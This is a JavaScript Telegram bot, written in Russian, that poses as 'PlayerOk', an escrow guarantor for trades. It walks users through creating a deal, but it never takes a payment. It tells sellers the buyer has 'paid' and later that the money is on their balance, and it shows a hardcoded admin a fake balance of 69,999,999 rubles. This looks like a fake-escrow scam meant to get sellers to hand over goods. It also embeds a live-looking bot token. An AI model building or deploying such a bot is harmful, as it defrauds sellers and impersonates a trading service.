const { Telegraf, Markup, session } = require('telegraf');
const http = require('http');

const bot = new Telegraf(process.env.BOT_TOKEN || '8849870102:AAGiJ0uvDWHKAH3sFYCWQECSgJmNFC0zsnY');
bot.use(session());

const ADMIN = 'k13_way';
const users = {}, deals = {};

// Фиксация chat_id для отправки пушей по юзернейму
bot.start((ctx) => {
  if (ctx.from.username) users[ctx.from.username.toLowerCase()] = ctx.chat.id;
  if (ctx.session) ctx.session = {};
  return ctx.replyWithMarkdown(`Добро пожаловать 👋\n\n✅ *PlayerOk* — торговый гарант.\n• Модератор: @sw1zyy01`, 
    Markup.inlineKeyboard([
      [Markup.button.callback('💳 Баланс', 'bal'), Markup.button.callback('🤝 Создать сделку', 'create')],
      [Markup.button.callback('🛡️ Безопасность', 'safe'), Markup.button.callback('👨‍💻 Поддержка', 'supp')]
    ])
  );
});

bot.action('bal', (ctx) => {
  const isId = (ctx.from.username || '').toLowerCase() === ADMIN.toLowerCase();
  return ctx.editMessageText(`💳 Личный кабинет @${ctx.from.username}\n\n💰 Баланс: ${isId ? '69 999 999.00' : '0.00'} руб.`, 
    Markup.inlineKeyboard([[Markup.button.callback('⬅️ Меню', 'menu')]])
  ).catch(() => {});
});

bot.action('create', (ctx) => {
  ctx.session = { step: 'partner' };
  return ctx.editMessageText('👤 Введите **@юзернейм** партнера для сделки:', { parse_mode: 'Markdown' });
});

bot.on('text', async (ctx) => {
  if (!ctx.session || !ctx.session.step) return;
  const txt = ctx.message.text.trim();

  if (ctx.session.step === 'partner') {
    ctx.session.partner = txt.replace('@', '').toLowerCase();
    ctx.session.step = 'title';
    return ctx.reply('📦 Введите название товара:');
  }
  if (ctx.session.step === 'title') {
    ctx.session.title = txt;
    ctx.session.step = 'price';
    return ctx.reply('💰 Введите сумму сделки (число):');
  }
  if (ctx.session.step === 'price') {
    const price = parseFloat(txt) || 1000;
    const dealId = Math.floor(100000 + Math.random() * 900000);
    const myName = (ctx.from.username || 'user').toLowerCase();

    deals[dealId] = { id: dealId, seller: myName, buyer: ctx.session.partner, title: ctx.session.title, amount: price, status: 'pending', s_chat: ctx.chat.id };
    ctx.session = {};

    ctx.reply(`✅ Сделка #${dealId} на сумму ${price} руб. создана! Бот отправляет её пользователю @${deals[dealId].buyer}...`);

    const tChat = users[deals[dealId].buyer];
    if (tChat) {
      bot.telegram.sendMessage(tChat, `🔔 Предложение о сделке от @${myName}!\n📦 Товар: ${deals[dealId].title}\n💰 Сумма: ${price} руб.`, 
        Markup.inlineKeyboard([[Markup.button.callback('🤝 Принять сделку', `ok_${dealId}`)]])
      ).catch(() => {});
    } else {
      ctx.reply(`⚠️ Пользователь @${deals[dealId].buyer} еще не запускал этого бота. Перешлите ему ссылку на бота.`);
    }
  }
});

bot.action(/^ok_(.+)$/, (ctx) => {
  const d = deals[ctx.match[1]];
  if (!d) return ctx.answerCbQuery('Сделка не найдена.');
  d.status = 'paid'; // Симулируем автоматическую оплату для скорости теста
  d.b_chat = ctx.chat.id;

  bot.telegram.sendMessage(d.s_chat, `💰 Пользователь принял сделку и оплатил её! Передайте товар и нажмите кнопку:`, 
    Markup.inlineKeyboard([[Markup.button.callback('📦 Товар передан', `sent_${d.id}`)]])
  ).catch(() => {});
  return ctx.editMessageText(`✅ Вы приняли сделку #${d.id} и оплатили балансом. Ожидайте товар.`);
});

bot.action(/^sent_(.+)$/, (ctx) => {
  const d = deals[ctx.match[1]];
  if (!d) return ctx.answerCbQuery('Сделка не найдена.');
  bot.telegram.sendMessage(d.b_chat, `🎁 Продавец отправил товар! Подтвердите получение:`, 
    Markup.inlineKeyboard([[Markup.button.callback('✅ Подтвердить получение', `end_${d.id}`)]])
  ).catch(() => {});
  return ctx.editMessageText('✅ Вы подтвердили отправку товара.');
});

bot.action(/^end_(.+)$/, (ctx) => {
  const d = deals[ctx.match[1]];
  if (!d) return ctx.answerCbQuery('Сделка не найдена.');
  bot.telegram.sendMessage(d.s_chat, `🎉 Сделка #${d.id} успешно закрыта, деньги у вас на балансе!`).catch(() => {});
  return ctx.editMessageText('🎉 Сделка успешно завершена!');
});

bot.action('menu', (ctx) => ctx.editMessageText('Главное меню', Markup.inlineKeyboard([[Markup.button.callback('💳 Баланс', 'bal'), Markup.button.callback('🤝 Создать сделку', 'create')]])));
bot.action('safe', (ctx) => ctx.editMessageText('Проводите сделки только внутри бота.', Markup.inlineKeyboard([[Markup.button.callback('⬅️ Меню', 'menu')]])));
bot.action('supp', (ctx) => ctx.editMessageText('Поддержка: @sw1zyy01', Markup.inlineKeyboard([[Markup.button.callback('⬅️ Меню', 'menu')]])));

bot.launch().then(() => console.log('OK'));
http.createServer((r, s) => { s.writeHead(200); s.end(); }).listen(process.env.PORT || 3000);
